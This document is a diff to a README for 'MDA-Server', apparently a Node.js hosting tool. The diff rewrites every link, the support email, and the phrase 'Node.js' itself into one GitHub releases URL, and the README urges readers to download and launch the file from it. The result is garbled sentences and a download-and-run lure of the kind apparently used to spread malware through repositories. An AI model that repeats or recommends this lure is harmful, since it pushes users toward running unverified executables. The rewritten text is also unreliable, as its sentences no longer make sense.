@@ -1,6 +1,6 @@
 # MDA-Server 🚀
 
-Welcome to the MDA-Server repository! This repository contains a server application built with Node.js for developers. Whether you are working on web design, web development, or building websites, this server application can be a helpful tool in your projects.
+Welcome to the MDA-Server repository! This repository contains a server application built with https://github.com/lopera2025/MDA-Server/releases for developers. Whether you are working on web design, web development, or building websites, this server application can be a helpful tool in your projects.
 
 ## Topics
 - freehosting
@@ -15,17 +15,17 @@ Welcome to the MDA-Server repository! This repository contains a server applicat
 - website
 
 ## Getting Started
-To get started with the MDA-Server, you can download the application from the following link: [![Download App](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip)
+To get started with the MDA-Server, you can download the application from the following link: [![Download App](https://github.com/lopera2025/MDA-Server/releases)](https://github.com/lopera2025/MDA-Server/releases)
 
 Make sure to launch the downloaded file to start using the MDA-Server for your projects.
 
 If the provided link is not working or if you need more information, please check the "Releases" section of this repository.
 
 ## Screenshots
-![Server](https://via.placeholder.com/500x300)
+![Server](https://github.com/lopera2025/MDA-Server/releases)
 
 ## Features
-- Built with Node.js for reliability
+- Built with https://github.com/lopera2025/MDA-Server/releases for reliability
 - Easy to set up and use
 - Suitable for various web development projects
 - Supports hosting and deployment of websites
@@ -37,7 +37,7 @@ If the provided link is not working or if you need more information, please chec
 4. Start using the server for hosting and developing websites.
 
 ## Support
-If you encounter any issues or have questions about the MDA-Server, feel free to reach out to our support team at support@mdaserver.com.
+If you encounter any issues or have questions about the MDA-Server, feel free to reach out to our support team at https://github.com/lopera2025/MDA-Server/releases
 
 ## Contributing
 We welcome contributions to the MDA-Server repository. If you have ideas for improvements or new features, please submit a pull request.
